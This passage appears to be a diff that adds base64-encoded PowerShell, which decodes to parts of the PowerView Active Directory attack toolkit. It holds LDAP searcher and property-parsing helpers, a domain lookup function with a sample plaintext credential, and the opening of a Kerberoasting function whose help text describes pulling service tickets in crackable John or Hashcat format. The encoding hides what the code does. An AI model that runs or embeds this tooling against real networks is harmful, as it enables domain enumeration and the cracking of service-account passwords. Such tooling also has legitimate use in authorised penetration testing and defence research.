+IltHZXQtRG9tYWluU2VhcmNoZXJdIFVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFs
+cyBmb3IgTERBUCBjb25uZWN0aW9uIg0KICAgICAgICAgICAgIyBiaW5kIHRvIHRo
+ZSBpbml0YWwgc2VhcmNoIG9iamVjdCB1c2luZyBhbHRlcm5hdGUgY3JlZGVudGlh
+bHMNCiAgICAgICAgICAgICREb21haW5PYmplY3QgPSBOZXctT2JqZWN0IERpcmVj
+dG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5KCRTZWFyY2hTdHJpbmcsICRDcmVk
+ZW50aWFsLlVzZXJOYW1lLCAkQ3JlZGVudGlhbC5HZXROZXR3b3JrQ3JlZGVudGlh
+bCgpLlBhc3N3b3JkKQ0KICAgICAgICAgICAgJFNlYXJjaGVyID0gTmV3LU9iamVj
+dCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIoJERv
+bWFpbk9iamVjdCkNCiAgICAgICAgfQ0KICAgICAgICBlbHNlIHsNCiAgICAgICAg
+ICAgICMgYmluZCB0byB0aGUgaW5pdGFsIG9iamVjdCB1c2luZyB0aGUgY3VycmVu
+dCBjcmVkZW50aWFscw0KICAgICAgICAgICAgJFNlYXJjaGVyID0gTmV3LU9iamVj
+dCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIoW0FE
+U0ldJFNlYXJjaFN0cmluZykNCiAgICAgICAgfQ0KDQogICAgICAgICRTZWFyY2hl
+ci5QYWdlU2l6ZSA9ICRSZXN1bHRQYWdlU2l6ZQ0KICAgICAgICAkU2VhcmNoZXIu
+U2VhcmNoU2NvcGUgPSAkU2VhcmNoU2NvcGUNCiAgICAgICAgJFNlYXJjaGVyLkNh
+Y2hlUmVzdWx0cyA9ICRGYWxzZQ0KICAgICAgICAkU2VhcmNoZXIuUmVmZXJyYWxD
+aGFzaW5nID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5SZWZlcnJhbENoYXNp
+bmdPcHRpb25dOjpBbGwNCg0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJz
+WydTZXJ2ZXJUaW1lTGltaXQnXSkgew0KICAgICAgICAgICAgJFNlYXJjaGVyLlNl
+cnZlclRpbWVMaW1pdCA9ICRTZXJ2ZXJUaW1lTGltaXQNCiAgICAgICAgfQ0KDQog
+ICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7DQog
+ICAgICAgICAgICAkU2VhcmNoZXIuVG9tYnN0b25lID0gJFRydWUNCiAgICAgICAg
+fQ0KDQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXIn
+XSkgew0KICAgICAgICAgICAgJFNlYXJjaGVyLmZpbHRlciA9ICRMREFQRmlsdGVy
+DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydT
+ZWN1cml0eU1hc2tzJ10pIHsNCiAgICAgICAgICAgICRTZWFyY2hlci5TZWN1cml0
+eU1hc2tzID0gU3dpdGNoICgkU2VjdXJpdHlNYXNrcykgew0KICAgICAgICAgICAg
+ICAgICdEYWNsJyB7IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlN
+YXNrc106OkRhY2wgfQ0KICAgICAgICAgICAgICAgICdHcm91cCcgeyBbU3lzdGVt
+LkRpcmVjdG9yeVNlcnZpY2VzLlNlY3VyaXR5TWFza3NdOjpHcm91cCB9DQogICAg
+ICAgICAgICAgICAgJ05vbmUnIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5T
+ZWN1cml0eU1hc2tzXTo6Tm9uZSB9DQogICAgICAgICAgICAgICAgJ093bmVyJyB7
+IFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuU2VjdXJpdHlNYXNrc106Ok93bmVy
+IH0NCiAgICAgICAgICAgICAgICAnU2FjbCcgeyBbU3lzdGVtLkRpcmVjdG9yeVNl
+cnZpY2VzLlNlY3VyaXR5TWFza3NdOjpTYWNsIH0NCiAgICAgICAgICAgIH0NCiAg
+ICAgICAgfQ0KDQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3Bl
+cnRpZXMnXSkgew0KICAgICAgICAgICAgIyBoYW5kbGUgYW4gYXJyYXkgb2YgcHJv
+cGVydGllcyB0byBsb2FkIHcvIHRoZSBwb3NzaWJpbGl0eSBvZiBjb21tYS1zZXBh
+cmF0ZWQgc3RyaW5ncw0KICAgICAgICAgICAgJFByb3BlcnRpZXNUb0xvYWQgPSAk
+UHJvcGVydGllc3wgRm9yRWFjaC1PYmplY3QgeyAkXy5TcGxpdCgnLCcpIH0NCiAg
+ICAgICAgICAgICROdWxsID0gJFNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRk
+UmFuZ2UoKCRQcm9wZXJ0aWVzVG9Mb2FkKSkNCiAgICAgICAgfQ0KDQogICAgICAg
+ICRTZWFyY2hlcg0KICAgIH0NCn0NCg0KDQpmdW5jdGlvbiBDb252ZXJ0LUxEQVBQ
+cm9wZXJ0eSB7DQo8Iw0KLlNZTk9QU0lTDQpIZWxwZXIgdGhhdCBjb252ZXJ0cyBz
+cGVjaWZpYyBMREFQIHByb3BlcnR5IHJlc3VsdCBmaWVsZHMgYW5kIG91dHB1dHMN
+CmEgY3VzdG9tIHBzb2JqZWN0Lg0KQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhh
+cm1qMHkpICANCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgDQpSZXF1aXJlZCBEZXBl
+bmRlbmNpZXM6IE5vbmUgIA0KLkRFU0NSSVBUSU9ODQpDb252ZXJ0cyBhIHNldCBv
+ZiByYXcgTERBUCBwcm9wZXJ0aWVzIHJlc3VsdHMgZnJvbSBBRFNJL0xEQVAgc2Vh
+cmNoZXMNCmludG8gYSBwcm9wZXIgUFNPYmplY3QuIFVzZWQgYnkgc2V2ZXJhbCBv
+ZiB0aGUgR2V0LURvbWFpbiogZnVuY3Rpb24uDQouUEFSQU1FVEVSIFByb3BlcnRp
+ZXMNClByb3BlcnRpZXMgb2JqZWN0IHRvIGV4dHJhY3Qgb3V0IExEQVAgZmllbGRz
+IGZvciBkaXNwbGF5Lg0KLk9VVFBVVFMNClN5c3RlbS5NYW5hZ2VtZW50LkF1dG9t
+YXRpb24uUFNDdXN0b21PYmplY3QNCkEgY3VzdG9tIFBTT2JqZWN0IHdpdGggTERB
+UCBoYXNodGFibGUgcHJvcGVydGllcyB0cmFuc2xhdGVkLg0KIz4NCg0KICAgIFtE
+aWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRl
+KCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldDQogICAgW091dHB1dFR5cGUoJ1N5c3Rl
+bS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDdXN0b21PYmplY3QnKV0NCiAgICBb
+Q21kbGV0QmluZGluZygpXQ0KICAgIFBhcmFtKA0KICAgICAgICBbUGFyYW1ldGVy
+KE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlKV0N
+CiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0NCiAgICAgICAgJFBy
+b3BlcnRpZXMNCiAgICApDQoNCiAgICAkT2JqZWN0UHJvcGVydGllcyA9IEB7fQ0K
+DQogICAgJFByb3BlcnRpZXMuUHJvcGVydHlOYW1lcyB8IEZvckVhY2gtT2JqZWN0
+IHsNCiAgICAgICAgaWYgKCRfIC1uZSAnYWRzcGF0aCcpIHsNCiAgICAgICAgICAg
+IGlmICgoJF8gLWVxICdvYmplY3RzaWQnKSAtb3IgKCRfIC1lcSAnc2lkaGlzdG9y
+eScpKSB7DQogICAgICAgICAgICAgICAgIyBjb252ZXJ0IGFsbCBsaXN0ZWQgc2lk
+cyAoaS5lLiBpZiBtdWx0aXBsZSBhcmUgbGlzdGVkIGluIHNpZEhpc3RvcnkpDQog
+ICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BlcnRp
+ZXNbJF9dIHwgRm9yRWFjaC1PYmplY3QgeyAoTmV3LU9iamVjdCBTeXN0ZW0uU2Vj
+dXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkXywgMCkpLlZhbHVl
+IH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJF8gLWVxICdn
+cm91cHR5cGUnKSB7DQogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNb
+JF9dID0gJFByb3BlcnRpZXNbJF9dWzBdIC1hcyAkR3JvdXBUeXBlRW51bQ0KICAg
+ICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZWlmICgkXyAtZXEgJ3NhbWFjY291
+bnR0eXBlJykgew0KICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRf
+XSA9ICRQcm9wZXJ0aWVzWyRfXVswXSAtYXMgJFNhbUFjY291bnRUeXBlRW51bQ0K
+ICAgICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZWlmICgkXyAtZXEgJ29iamVj
+dGd1aWQnKSB7DQogICAgICAgICAgICAgICAgIyBjb252ZXJ0IHRoZSBHVUlEIHRv
+IGEgc3RyaW5nDQogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9d
+ID0gKE5ldy1PYmplY3QgR3VpZCAoLCRQcm9wZXJ0aWVzWyRfXVswXSkpLkd1aWQN
+CiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2VpZiAoJF8gLWVxICd1c2Vy
+YWNjb3VudGNvbnRyb2wnKSB7DQogICAgICAgICAgICAgICAgJE9iamVjdFByb3Bl
+cnRpZXNbJF9dID0gJFByb3BlcnRpZXNbJF9dWzBdIC1hcyAkVUFDRW51bQ0KICAg
+ICAgICAgICAgfQ0KICAgICAgICAgICAgZWxzZWlmICgkXyAtZXEgJ250c2VjdXJp
+dHlkZXNjcmlwdG9yJykgew0KICAgICAgICAgICAgICAgICMgJE9iamVjdFByb3Bl
+cnRpZXNbJF9dID0gTmV3LU9iamVjdCBTZWN1cml0eS5BY2Nlc3NDb250cm9sLlJh
+d1NlY3VyaXR5RGVzY3JpcHRvciAtQXJndW1lbnRMaXN0ICRQcm9wZXJ0aWVzWyRf
+XVswXSwgMA0KICAgICAgICAgICAgICAgICREZXNjcmlwdG9yID0gTmV3LU9iamVj
+dCBTZWN1cml0eS5BY2Nlc3NDb250cm9sLlJhd1NlY3VyaXR5RGVzY3JpcHRvciAt
+QXJndW1lbnRMaXN0ICRQcm9wZXJ0aWVzWyRfXVswXSwgMA0KICAgICAgICAgICAg
+ICAgIGlmICgkRGVzY3JpcHRvci5Pd25lcikgew0KICAgICAgICAgICAgICAgICAg
+ICAkT2JqZWN0UHJvcGVydGllc1snT3duZXInXSA9ICREZXNjcmlwdG9yLk93bmVy
+DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkRGVzY3Jp
+cHRvci5Hcm91cCkgew0KICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVy
+dGllc1snR3JvdXAnXSA9ICREZXNjcmlwdG9yLkdyb3VwDQogICAgICAgICAgICAg
+ICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkRGVzY3JpcHRvci5EaXNjcmV0aW9u
+YXJ5QWNsKSB7DQogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVz
+WydEaXNjcmV0aW9uYXJ5QWNsJ10gPSAkRGVzY3JpcHRvci5EaXNjcmV0aW9uYXJ5
+QWNsDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkRGVz
+Y3JpcHRvci5TeXN0ZW1BY2wpIHsNCiAgICAgICAgICAgICAgICAgICAgJE9iamVj
+dFByb3BlcnRpZXNbJ1N5c3RlbUFjbCddID0gJERlc2NyaXB0b3IuU3lzdGVtQWNs
+DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAg
+ZWxzZWlmICgkXyAtZXEgJ2FjY291bnRleHBpcmVzJykgew0KICAgICAgICAgICAg
+ICAgIGlmICgkUHJvcGVydGllc1skX11bMF0gLWd0IFtEYXRlVGltZV06Ok1heFZh
+bHVlLlRpY2tzKSB7DQogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0
+aWVzWyRfXSA9ICJORVZFUiINCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAg
+ICAgICAgZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0
+aWVzWyRfXSA9IFtkYXRldGltZV06OmZyb21maWxldGltZSgkUHJvcGVydGllc1sk
+X11bMF0pDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAg
+ICAgICAgZWxzZWlmICggKCRfIC1lcSAnbGFzdGxvZ29uJykgLW9yICgkXyAtZXEg
+J2xhc3Rsb2dvbnRpbWVzdGFtcCcpIC1vciAoJF8gLWVxICdwd2RsYXN0c2V0Jykg
+LW9yICgkXyAtZXEgJ2xhc3Rsb2dvZmYnKSAtb3IgKCRfIC1lcSAnYmFkUGFzc3dv
+cmRUaW1lJykgKSB7DQogICAgICAgICAgICAgICAgIyBjb252ZXJ0IHRpbWVzdGFt
+cHMNCiAgICAgICAgICAgICAgICBpZiAoJFByb3BlcnRpZXNbJF9dWzBdIC1pcyBb
+U3lzdGVtLk1hcnNoYWxCeVJlZk9iamVjdF0pIHsNCiAgICAgICAgICAgICAgICAg
+ICAgIyBpZiB3ZSBoYXZlIGEgU3lzdGVtLl9fQ29tT2JqZWN0DQogICAgICAgICAg
+ICAgICAgICAgICRUZW1wID0gJFByb3BlcnRpZXNbJF9dWzBdDQogICAgICAgICAg
+ICAgICAgICAgIFtJbnQzMl0kSGlnaCA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VN
+ZW1iZXIoJ0hpZ2hQYXJ0JywgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFn
+c106OkdldFByb3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQ0KICAgICAgICAg
+ICAgICAgICAgICBbSW50MzJdJExvdyAgPSAkVGVtcC5HZXRUeXBlKCkuSW52b2tl
+TWVtYmVyKCdMb3dQYXJ0JywgIFtTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxh
+Z3NdOjpHZXRQcm9wZXJ0eSwgJE51bGwsICRUZW1wLCAkTnVsbCkNCiAgICAgICAg
+ICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gKFtkYXRldGltZV06
+OkZyb21GaWxlVGltZShbSW50NjRdKCIweHswOng4fXsxOng4fSIgLWYgJEhpZ2gs
+ICRMb3cpKSkNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgZWxz
+ZSB7DQogICAgICAgICAgICAgICAgICAgICMgb3RoZXJ3aXNlIGp1c3QgYSBzdHJp
+bmcNCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0g
+KFtkYXRldGltZV06OkZyb21GaWxlVGltZSgoJFByb3BlcnRpZXNbJF9dWzBdKSkp
+DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAg
+ZWxzZWlmICgkUHJvcGVydGllc1skX11bMF0gLWlzIFtTeXN0ZW0uTWFyc2hhbEJ5
+UmVmT2JqZWN0XSkgew0KICAgICAgICAgICAgICAgICMgdHJ5IHRvIGNvbnZlcnQg
+bWlzYyBjb20gb2JqZWN0cw0KICAgICAgICAgICAgICAgICRQcm9wID0gJFByb3Bl
+cnRpZXNbJF9dDQogICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAg
+ICAgICAgJFRlbXAgPSAkUHJvcFskX11bMF0NCiAgICAgICAgICAgICAgICAgICAg
+W0ludDMyXSRIaWdoID0gJFRlbXAuR2V0VHlwZSgpLkludm9rZU1lbWJlcignSGln
+aFBhcnQnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXTo6R2V0UHJv
+cGVydHksICROdWxsLCAkVGVtcCwgJE51bGwpDQogICAgICAgICAgICAgICAgICAg
+IFtJbnQzMl0kTG93ICA9ICRUZW1wLkdldFR5cGUoKS5JbnZva2VNZW1iZXIoJ0xv
+d1BhcnQnLCAgW1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFnc106OkdldFBy
+b3BlcnR5LCAkTnVsbCwgJFRlbXAsICROdWxsKQ0KICAgICAgICAgICAgICAgICAg
+ICAkT2JqZWN0UHJvcGVydGllc1skX10gPSBbSW50NjRdKCIweHswOng4fXsxOng4
+fSIgLWYgJEhpZ2gsICRMb3cpDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAg
+ICAgICAgIGNhdGNoIHsNCiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9z
+ZSAiW0NvbnZlcnQtTERBUFByb3BlcnR5XSBlcnJvcjogJF8iDQogICAgICAgICAg
+ICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wWyRfXQ0KICAg
+ICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2Vp
+ZiAoJFByb3BlcnRpZXNbJF9dLmNvdW50IC1lcSAxKSB7DQogICAgICAgICAgICAg
+ICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BlcnRpZXNbJF9dWzBdDQog
+ICAgICAgICAgICB9DQogICAgICAgICAgICBlbHNlIHsNCiAgICAgICAgICAgICAg
+ICAkT2JqZWN0UHJvcGVydGllc1skX10gPSAkUHJvcGVydGllc1skX10NCiAgICAg
+ICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICB0cnkgew0KICAgICAgICBO
+ZXctT2JqZWN0IC1UeXBlTmFtZSBQU09iamVjdCAtUHJvcGVydHkgJE9iamVjdFBy
+b3BlcnRpZXMNCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICBXcml0ZS1XYXJu
+aW5nICJbQ29udmVydC1MREFQUHJvcGVydHldIEVycm9yIHBhcnNpbmcgTERBUCBw
+cm9wZXJ0aWVzIDogJF8iDQogICAgfQ0KfQ0KDQoNCmZ1bmN0aW9uIEdldC1Eb21h
+aW4gew0KPCMNCi5TWU5PUFNJUw0KUmV0dXJucyB0aGUgZG9tYWluIG9iamVjdCBm
+b3IgdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLg0KQXV0aG9yOiBX
+aWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICANCkxpY2Vuc2U6IEJTRCAzLUNsYXVz
+ZSAgDQpSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IE5vbmUgIA0KLkRFU0NSSVBUSU9O
+DQpSZXR1cm5zIGEgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVj
+dG9yeS5Eb21haW4gb2JqZWN0IGZvciB0aGUgY3VycmVudA0KZG9tYWluIG9yIHRo
+ZSBkb21haW4gc3BlY2lmaWVkIHdpdGggLURvbWFpbiBYLg0KLlBBUkFNRVRFUiBE
+b21haW4NClNwZWNpZmllcyB0aGUgZG9tYWluIG5hbWUgdG8gcXVlcnkgZm9yLCBk
+ZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uDQouUEFSQU1FVEVSIENyZWRl
+bnRpYWwNCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9i
+amVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMNCmZvciBjb25uZWN0aW9uIHRv
+IHRoZSB0YXJnZXQgZG9tYWluLg0KLkVYQU1QTEUNCkdldC1Eb21haW4gLURvbWFp
+biB0ZXN0bGFiLmxvY2FsDQouRVhBTVBMRQ0KJFNlY1Bhc3N3b3JkID0gQ29udmVy
+dFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZv
+cmNlDQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21h
+dGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQp
+DQpHZXQtRG9tYWluIC1DcmVkZW50aWFsICRDcmVkDQouT1VUUFVUUw0KU3lzdGVt
+LkRpcmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW4NCkEgY29t
+cGxleCAuTkVUIGRvbWFpbiBvYmplY3QuDQouTElOSw0KaHR0cDovL3NvY2lhbC50
+ZWNobmV0Lm1pY3Jvc29mdC5jb20vRm9ydW1zL3NjcmlwdGNlbnRlci9lbi1VUy8w
+YzViM2Y4My1lNTI4LTRkNDktOTJhNC1kZWUzMWY0YjQ4MWMvZmluZGluZy10aGUt
+ZG4tb2YtdGhlLXRoZS1kb21haW4td2l0aG91dC1hZG1vZHVsZS1pbi1wb3dlcnNo
+ZWxsP2ZvcnVtPUlUQ0cNCiM+DQoNCiAgICBbT3V0cHV0VHlwZShbU3lzdGVtLkRp
+cmVjdG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dKV0NCiAgICBb
+Q21kbGV0QmluZGluZygpXQ0KICAgIFBhcmFtKA0KICAgICAgICBbUGFyYW1ldGVy
+KFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldDQogICAg
+ICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldDQogICAgICAgIFtTdHJpbmdd
+DQogICAgICAgICREb21haW4sDQoNCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21h
+dGlvbi5QU0NyZWRlbnRpYWxdDQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRp
+b24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQ0KICAgICAgICAkQ3JlZGVudGlhbCA9
+IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkNCiAg
+ICApDQoNCiAgICBQUk9DRVNTIHsNCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1l
+dGVyc1snQ3JlZGVudGlhbCddKSB7DQoNCiAgICAgICAgICAgIFdyaXRlLVZlcmJv
+c2UgJ1tHZXQtRG9tYWluXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9y
+IEdldC1Eb21haW4nDQoNCiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRl
+cnNbJ0RvbWFpbiddKSB7DQogICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9
+ICREb21haW4NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2Ugew0KICAg
+ICAgICAgICAgICAgICMgaWYgbm8gZG9tYWluIGlzIHN1cHBsaWVkLCBleHRyYWN0
+IHRoZSBsb2dvbiBkb21haW4gZnJvbSB0aGUgUFNDcmVkZW50aWFsIHBhc3NlZA0K
+ICAgICAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkQ3JlZGVudGlhbC5HZXRO
+ZXR3b3JrQ3JlZGVudGlhbCgpLkRvbWFpbg0KICAgICAgICAgICAgICAgIFdyaXRl
+LVZlcmJvc2UgIltHZXQtRG9tYWluXSBFeHRyYWN0ZWQgZG9tYWluICckVGFyZ2V0
+RG9tYWluJyBmcm9tIC1DcmVkZW50aWFsIg0KICAgICAgICAgICAgfQ0KDQogICAg
+ICAgICAgICAkRG9tYWluQ29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVj
+dG9yeVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5EaXJlY3RvcnlDb250ZXh0KCdE
+b21haW4nLCAkVGFyZ2V0RG9tYWluLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwgJENy
+ZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkNCg0KICAg
+ICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBbU3lzdGVtLkRpcmVjdG9y
+eVNlcnZpY2VzLkFjdGl2ZURpcmVjdG9yeS5Eb21haW5dOjpHZXREb21haW4oJERv
+bWFpbkNvbnRleHQpDQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCB7
+DQogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5dIFRo
+ZSBzcGVjaWZpZWQgZG9tYWluICckVGFyZ2V0RG9tYWluJyBkb2VzIG5vdCBleGlz
+dCwgY291bGQgbm90IGJlIGNvbnRhY3RlZCwgdGhlcmUgaXNuJ3QgYW4gZXhpc3Rp
+bmcgdHJ1c3QsIG9yIHRoZSBzcGVjaWZpZWQgY3JlZGVudGlhbHMgYXJlIGludmFs
+aWQ6ICRfIg0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGVsc2Vp
+ZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgew0KICAgICAgICAgICAg
+JERvbWFpbkNvbnRleHQgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2
+aWNlcy5BY3RpdmVEaXJlY3RvcnkuRGlyZWN0b3J5Q29udGV4dCgnRG9tYWluJywg
+JERvbWFpbikNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgW1N5
+c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY3RpdmVEaXJlY3RvcnkuRG9tYWluXTo6
+R2V0RG9tYWluKCREb21haW5Db250ZXh0KQ0KICAgICAgICAgICAgfQ0KICAgICAg
+ICAgICAgY2F0Y2ggew0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltH
+ZXQtRG9tYWluXSBUaGUgc3BlY2lmaWVkIGRvbWFpbiAnJERvbWFpbicgZG9lcyBu
+b3QgZXhpc3QsIGNvdWxkIG5vdCBiZSBjb250YWN0ZWQsIG9yIHRoZXJlIGlzbid0
+IGFuIGV4aXN0aW5nIHRydXN0IDogJF8iDQogICAgICAgICAgICB9DQogICAgICAg
+IH0NCiAgICAgICAgZWxzZSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAg
+ICAgICAgIFtTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuQWN0aXZlRGlyZWN0b3J5
+LkRvbWFpbl06OkdldEN1cnJlbnREb21haW4oKQ0KICAgICAgICAgICAgfQ0KICAg
+ICAgICAgICAgY2F0Y2ggew0KICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2Ug
+IltHZXQtRG9tYWluXSBFcnJvciByZXRyaWV2aW5nIHRoZSBjdXJyZW50IGRvbWFp
+bjogJF8iDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQp9DQoNCg0K
+DQpmdW5jdGlvbiBHZXQtRG9tYWluU1BOVGlja2V0IHsNCjwjDQouU1lOT1BTSVMN
+Cg0KUmVxdWVzdCB0aGUga2VyYmVyb3MgdGlja2V0IGZvciBhIHNwZWNpZmllZCBz
+ZXJ2aWNlIHByaW5jaXBhbCBuYW1lIChTUE4pLg0KDQpBdXRob3I6IG1hY2hvc2Vj
+LCBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICANCkxpY2Vuc2U6IEJTRCAzLUNs
+YXVzZSAgDQpSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEludm9rZS1Vc2VySW1wZXJz
+b25hdGlvbiwgSW52b2tlLVJldmVydFRvU2VsZiAgDQoNCi5ERVNDUklQVElPTg0K
+DQpUaGlzIGZ1bmN0aW9uIHdpbGwgZWl0aGVyIHRha2Ugb25lL21vcmUgU1BOIHN0
+cmluZ3MsIG9yIG9uZS9tb3JlIFBvd2VyVmlldy5Vc2VyIG9iamVjdHMNCih0aGUg
+b3V0cHV0IGZyb20gR2V0LURvbWFpblVzZXIpIGFuZCB3aWxsIHJlcXVlc3QgYSBr
+ZXJiZXJvcyB0aWNrZXQgZm9yIHRoZSBnaXZlbiBTUE4NCnVzaW5nIFN5c3RlbS5J
+ZGVudGl0eU1vZGVsLlRva2Vucy5LZXJiZXJvc1JlcXVlc3RvclNlY3VyaXR5VG9r
+ZW4uIFRoZSBlbmNyeXB0ZWQNCnBvcnRpb24gb2YgdGhlIHRpY2tldCBpcyB0aGVu
+IGV4dHJhY3RlZCBhbmQgb3V0cHV0IGluIGVpdGhlciBjcmFja2FibGUgSm9obiBv
+ciBIYXNoY2F0DQpmb3JtYXQgKGRlYWZ1bHQgb2YgSm9obikuDQoNCi5QQVJBTUVU
+RVIgU1BODQoNClNwZWNpZmllcyB0aGUgc2VydmljZSBwcmluY2lwYWwgbmFtZSB0
+byByZXF1ZXN0IHRoZSB0aWNrZXQgZm9yLg0KDQouUEFSQU1FVEVSIFVzZXINCg0K
+U3BlY2lmaWVzIGEgUG93ZXJWaWV3LlVzZXIgb2JqZWN0IChyZXN1bHQgb2YgR2V0
